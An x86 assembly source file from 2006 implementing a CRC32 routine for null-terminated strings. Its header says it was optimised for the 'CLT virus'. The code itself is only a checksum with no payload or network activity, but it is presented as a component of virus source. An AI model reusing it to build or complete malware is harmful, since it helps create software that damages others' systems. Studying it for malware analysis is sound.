;= CRC32 Sub-Procedures (c) 2006 JPanic ===================================
;
; !!! Optimised for CLT virus.
; !!! MODIFIED TO ONLY DO ASCIIZ CRC'S
; !!! MODIFIED TO LEAVE ESI AT END OF INPUT
;
; These routine use the standard CRC32 algorithm with the exception that
; they DO NOT invert (bitwise negate) the final CRC, to save on a redundant
; instruction. See CRC.ASH for more details.
;
; Provides Sub-Procedures to calculate a CRC32:
;
;	GetCRC32	- Return CRC32 of ECX bytes at *ESI in EAX.
;	GetCRC32az	- Return CRC32 of ASCIIZ string at *ESI in EAX.
;
;= Directive Warez ========================================================

	.486
	.model flat
	locals @@

	_CRC_ASM	EQU 	TRUE
        include crc.ash

;= Code Warez =============================================================
        include codeseg.ash
;= GetCRC32 ===============================================================
;
; Inputs:
;	ESI = Offset of data to checksum.
;	ECX = Number of bytes to process (0 for ASCIIZ).
;
; Outputs:
;	EAX = CRC32 of input.
;
;--------------------------------------------------------------------------
PUBLIC GetCRC32
GetCRC32	PROC

		push	edx
		or	edx,CRC_INIT
	@@ByteLoop:	lodsb
			mov	ah,8
			xor	dl,al
		@@BitLoop:	shr	edx,1
				jnc	@@NoXOR
					xor	edx,CRC_POLY
			@@NoXOR:dec	ah
				jnz	@@BitLoop
		COMMENT !	
			jecxz	@@NoECX
				loop	@@ByteLoop
				test	eax,123h
				org	$-4
			!
		@@NoECX:test	al,al
			jnz	@@ByteLoop
		xchg	edx,eax
		pop	edx
                ret
		
GetCRC32	ENDP		

COMMENT $
;= GetCRC32az =============================================================
;
; Inputs:
;	ESI = Offset of data to checksum.
;
; Outputs:
;	EAX = CRC32 of input.
;
;--------------------------------------------------------------------------
PUBLIC GetCRC32az
GetCRC32az	PROC

		push	ecx
		xor	ecx,ecx
		call	GetCRC32
		pop	ecx
		ret

GetCRC32az	ENDP
$

;==========================================================================
                ENDS
		END
;==========================================================================
